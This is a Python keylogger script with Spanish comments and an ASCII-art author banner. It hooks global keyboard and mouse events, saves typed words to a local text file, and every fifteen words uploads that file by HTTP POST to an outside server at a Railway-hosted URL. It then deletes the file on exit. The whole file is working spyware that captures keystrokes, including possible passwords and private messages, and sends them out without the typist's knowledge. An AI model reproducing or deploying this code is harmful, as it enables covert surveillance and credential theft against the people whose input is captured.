'''
 ▄████▄   ██▀███  ▓█████ ▄▄▄      ▓█████▄  ▒█████      ██▓███   ▒█████   ██▀███              
▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▒██▒  ██▒   ▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒            
▒▓█    ▄ ▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ░██   █▌▒██░  ██▒   ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒            
▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░   ▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄              
▒ ▓███▀ ░░██▓ ▒██▒░▒████▒▓█   ▓██▒░▒████▓ ░ ████▓▒░   ▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒            
░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░            
  ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░    ░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░            
░          ░░   ░    ░    ░   ▒    ░ ░  ░ ░ ░ ░ ▒     ░░       ░ ░ ░ ▒    ░░   ░             
░ ░         ░        ░  ░     ░  ░   ░        ░ ░                  ░ ░     ░                 
░                                  ░                                                         
 ███▄    █  ██▓ ▄████▄   ▒█████   ██▓     █    ██  ██ ▄█▀▄▄▄      ▒███████▒▒███████▒▒███████▒
 ██ ▀█   █ ▓██▒▒██▀ ▀█  ▒██▒  ██▒▓██▒     ██  ▓██▒ ██▄█▒▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░
▓██  ▀█ ██▒▒██▒▒▓█    ▄ ▒██░  ██▒▒██░    ▓██  ▒██░▓███▄░▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░ 
▓██▒  ▐▌██▒░██░▒▓▓▄ ▄██▒▒██   ██░▒██░    ▓▓█  ░██░▓██ █▄░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ▄▀▒   ░
▒██░   ▓██░░██░▒ ▓███▀ ░░ ████▓▒░░██████▒▒▒█████▓ ▒██▒ █▄▓█   ▓██▒▒███████▒▒███████▒▒███████▒
░ ▒░   ▒ ▒ ░▓  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒
░ ░░   ░ ▒░ ▒ ░  ░  ▒     ░ ▒ ▒░ ░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒ ▒░ ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒
   ░   ░ ░  ▒ ░░        ░ ░ ░ ▒    ░ ░    ░░░ ░ ░ ░ ░░ ░  ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░░ ░ ░ ░ ░
         ░  ░  ░ ░          ░ ░      ░  ░   ░     ░  ░        ░  ░  ░ ░      ░ ░      ░ ░    
               ░                                                  ░        ░        ░        
'''
#Importamos librerias necesarias para el funcionamiento del keylogger
import keyboard
import mouse
import requests
import os

palabra = ""
line_count = 0

def key(pulso): #Función callback para detectar cuando se presiona una tecla
    global palabra
    if pulso.event_type == keyboard.KEY_DOWN:
        if pulso.name == "space":            
            save_word()
        elif len(pulso.name) == 1 and pulso.name.isprintable():
            palabra += pulso.name


def on_click(click): #Función callback para detectar cuando se presiona el click
    if isinstance(click, mouse.ButtonEvent):
        if click.event_type == "down":
            #print("click")
            save_word()
    
    

keyboard.hook(key)
mouse.hook(on_click)

def save_word(): #Crea un txt y va guardando palabras cada que se presione espacio
    
    global line_count
    
    with open("block.txt", "a") as file:
        file.write(palabra + "\n")
        
    #print(palabra + "\n")
    line_count += 1
        
    if line_count >= 15:
        send_server("block.txt")
        line_count = 0
    reset()  
    

def send_server(filename): #Envía el txt al servidor con un POST
    url = "https://keylogger-production.up.railway.app/upload"
    with open(filename, "rb") as file:
        try:
            response = requests.post(url, files={"file": file})
            #print(f"Respuesta del servidor: {response.text}")
        except requests.exceptions.RequestException as e:
            return e
    
    
def reset(): #Resetea la palabra
    global palabra
    palabra = ""

try: #Detiene el scipt cuando se presiona Escape y llama a la función unhook_all()
    keyboard.wait()
except KeyboardInterrupt:
    #print("Script detenido")
    pass
finally:
    keyboard.unhook_all()
    mouse.unhook_all()
    os.remove("block.txt")